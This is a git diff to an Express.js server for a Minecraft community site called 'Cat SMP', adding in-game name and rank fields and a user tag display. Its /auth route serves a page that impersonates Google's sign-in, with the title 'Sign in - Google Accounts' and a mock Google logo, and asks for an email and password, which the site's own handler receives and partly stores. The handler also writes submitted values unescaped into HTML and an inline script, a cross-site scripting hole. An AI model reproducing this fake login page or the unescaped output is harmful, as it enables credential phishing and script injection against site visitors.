@@ -74,6 +74,7 @@ const siteStyles = `
       transition: background 0.3s, color 0.3s;
     }
     .menu-container { position: absolute; top: 20px; left: 20px; text-align: left; z-index: 1000; }
+    .user-tag-container { position: absolute; top: 20px; right: 20px; z-index: 1000; background-color: var(--box-bg); border: 1px solid var(--box-border); padding: 8px 14px; border-radius: 8px; font-size: 0.95rem; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
     .hamburger-btn { background-color: var(--btn-bg); color: var(--btn-color); border: 1px solid var(--box-border); padding: 10px 14px; font-size: 1.3rem; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); font-weight: bold; }
     .hamburger-btn:hover { background-color: var(--btn-hover); }
     .dropdown-box { display: none; position: absolute; top: 55px; left: 0; background-color: var(--box-bg); backdrop-filter: blur(10px); border: 1px solid var(--box-border); border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 220px; overflow: hidden; z-index: 1001; }
@@ -101,7 +102,7 @@ const siteStyles = `
     .content-box h2 { color: #ffcc00; text-align: center; margin-top: 0; }
     .form-group { margin-bottom: 20px; }
     .form-group label { display: block; color: var(--text-color); margin-bottom: 8px; font-weight: bold; }
-    .form-group input, .form-group textarea { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid var(--input-border); background-color: var(--input-bg); color: var(--input-color); font-size: 1rem; box-sizing: border-box; }
+    .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid var(--input-border); background-color: var(--input-bg); color: var(--input-color); font-size: 1rem; box-sizing: border-box; }
     .form-group textarea { resize: vertical; height: 120px; }
     .back-home { display: inline-block; margin-top: 30px; color: #ffcc00; text-decoration: none; font-weight: bold; }
     .ad-container { margin-top: 30px; display: flex; justify-content: center; align-items: center; }
@@ -117,7 +118,7 @@ const siteStyles = `
     .google-subtitle { text-align: center; font-size: 1.1rem; color: #5f6368; margin-bottom: 30px; }
     .google-field { margin-bottom: 20px; }
     .google-field label { display: block; font-size: 0.9rem; color: #202124; margin-bottom: 6px; font-weight: 600; }
-    .google-field input { width: 100%; padding: 12px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 1rem; box-sizing: border-box; }
+    .google-field input, .google-field select { width: 100%; padding: 12px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 1rem; box-sizing: border-box; }
     .google-btn { background-color: #1a73e8; color: #ffffff; width: 100%; padding: 12px 0; border: none; border-radius: 4px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 10px; }
   </style>
   <script>
@@ -149,11 +150,20 @@ const siteStyles = `
       const savedTheme = localStorage.getItem("theme");
       if (savedTheme === "light") { document.getElementById("lightModeSwitch").checked = true; document.body.classList.add("light-mode"); }
       else if (savedTheme === "dark") { document.getElementById("darkModeSwitch").checked = true; document.body.classList.add("dark-mode"); }
+      
+      const savedUser = localStorage.getItem("catSmpUser");
+      const savedRank = localStorage.getItem("catSmpRank");
+      if (savedUser) {
+        const userTag = document.getElementById("userTagDisplay");
+        if (userTag) {
+          userTag.innerText = "[" + (savedRank || "Member") + "] " + savedUser;
+          userTag.style.display = "block";
+        }
+      }
     });
   </script>
 `;
-
-const hamburgerHTML = `
+  const hamburgerHTML = `
   <div class="menu-container" onclick="event.stopPropagation()">
     <button class="hamburger-btn" onclick="toggleMenu()">☰</button>
     <div id="dropdownMenu" class="dropdown-box">
@@ -162,6 +172,7 @@ const hamburgerHTML = `
       <button class="menu-item-btn" onclick="openSettingsModal()">⚙️ Settings</button>
     </div>
   </div>
+  <div id="userTagDisplay" class="user-tag-container" style="display: none;"></div>
   <div id="settingsModal" class="modal-overlay">
     <div class="modal-card">
       <h3>Settings <button class="close-modal" onclick="closeSettingsModal()">&times;</button></h3>
@@ -229,13 +240,13 @@ app.post('/ticket/submit', (req, res) => {
 });
 
 app.get('/auth', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><div class="google-field"><label for="ign">In-Game Name</label><input type="text" id="ign" name="ign" required placeholder="Enter your Minecraft IGN"></div><div class="google-field"><label for="rank">In-Game Rank</label><select id="rank" name="rank" required><option value="[Owner]">[Owner]</option><option value="[MANAGER]">[MANAGER]</option><option value="[MAIN MOD]">[MAIN MOD]</option><option value="[MOD]">[MOD]</option><option value="[Builder]">[Builder]</option><option value="[Special]">[Special]</option><option value="[Member]" selected>[Member]</option></select></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
 });
 
 app.post('/auth/submit', (req, res) => {
-  const { email } = req.body;
-  userStorage.push({ email, timestamp: new Date().toLocaleString() });
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Signed In</title>${headContent}</head><body>${hamburgerHTML}<h1>Welcome!</h1><p>You have successfully signed in.</p><div class="content-box" style="text-align: center;"><h2>✅ Success</h2><p style="margin-bottom: 20px;">Signed in as <strong>${email}</strong></p><a href="/" class="btn" style="display: inline-block; width: auto; padding: 12px 30px;">Return Home</a></div></body></html>`);
+  const { email, ign, rank } = req.body;
+  userStorage.push({ email, ign, rank, timestamp: new Date().toLocaleString() });
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Signed In</title>${headContent}</head><body>${hamburgerHTML}<h1>Welcome!</h1><p>You have successfully signed in.</p><div class="content-box" style="text-align: center;"><h2>✅ Success</h2><p style="margin-bottom: 20px;">Signed in as <strong>${email}</strong><br>In-Game: <strong>${rank} ${ign}</strong></p><script>localStorage.setItem("catSmpUser", "${ign}"); localStorage.setItem("catSmpRank", "${rank}");</script><a href="/" class="btn" style="display: inline-block; width: auto; padding: 12px 30px;">Return Home</a></div></body></html>`);
 });
 
 app.get('/secret/tickets', (req, res) => {
@@ -246,4 +257,4 @@ app.get('/secret/tickets', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Cat SMP server is running on port ${PORT}`);
 });
-    
+                       
